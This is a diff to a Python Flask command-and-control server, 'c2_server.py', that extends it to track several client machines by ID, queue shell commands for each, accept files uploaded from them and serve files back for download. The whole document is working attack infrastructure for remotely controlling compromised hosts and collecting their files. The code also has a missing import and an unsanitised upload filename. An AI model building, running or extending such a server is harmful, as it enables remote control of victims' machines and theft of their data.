@@ -1,31 +1,70 @@
 # c2_server.py - Ethan Zeevi
 from flask import Flask, request, jsonify
+import os
 
 app = Flask(__name__)
 
-# Store the command that should be sent to the client
-command_to_send = ""
+# Dictionary to store client UUIDs and commands
+clients = {}
 
-@app.route('/command', methods=['GET'])
-def get_command():
-    global command_to_send
-    response = {'command': command_to_send}
-    command_to_send = ""  # Clear the command once sent
-    return jsonify(response)
+# Folder to store uploaded files
+UPLOAD_FOLDER = "uploads"
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
-@app.route('/result', methods=['POST'])
-def receive_result():
+#Endpoint for clients to register to be able to be tracked dynamically
+@app.route('/register_client', methods=['POST'])
+def register_client():
     data = request.json
-    print(f"Client result: {data['result']}")
-    return jsonify({'status': 'ok'})
+    client_id = data.get('client_id')
+    if client_id not in clients:
+        clients[client_id] = ""  # Register new client with empty command
+        print(f"Registered new client: {client_id}")
+    return jsonify({'status': 'client registered', 'client_id': client_id})
 
-@app.route('/set_command', methods=['POST'])
-def set_command():
-    global command_to_send
+@app.route('/clients', methods=['GET'])
+def get_clients():
+    # Return a list of registered clients
+    return jsonify({'clients': list(clients.keys())})
+
+# Endpoint for clients to retrieve command
+@app.route('/command/<client_id>', methods=['GET'])
+def get_command(client_id):
+    command = clients.get(client_id, "")
+    clients[client_id] = ""  # Clear command once retrieved
+    return jsonify({'command': command})
+
+# Sets command for client to execute
+@app.route('/set_command/<client_id>', methods=['POST'])
+def set_command(client_id):
     data = request.json
-    command_to_send = data['command']
-    print(f"Command set: {command_to_send}")
-    return jsonify({'status': 'command set'})
+    command = data.get('command', '')
+    if client_id in clients:
+        clients[client_id] = command
+        print(f"Command set for {client_id}: {command}")
+        return jsonify({'status': 'command set'})
+    else:
+        return jsonify({'status': 'client not found'}), 404
+
+# Uploads file from client to server
+@app.route('/upload/<client_id>', methods=['POST'])
+def upload_file(client_id):
+    if 'file' not in request.files:
+        return jsonify({'status': 'no file part'})
+
+    file = request.files['file']
+    if file.filename == '':
+        return jsonify({'status': 'no selected file'})
+
+    filepath = os.path.join(UPLOAD_FOLDER, file.filename)
+    file.save(filepath)
+    print(f"File {file.filename} uploaded from {client_id}")
+    return jsonify({'status': 'file uploaded'})
+
+# Sends file to client to download
+@app.route('/download/<filename>', methods=['GET'])
+def download_file(filename):
+    return send_from_directory(UPLOAD_FOLDER, filename)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
+
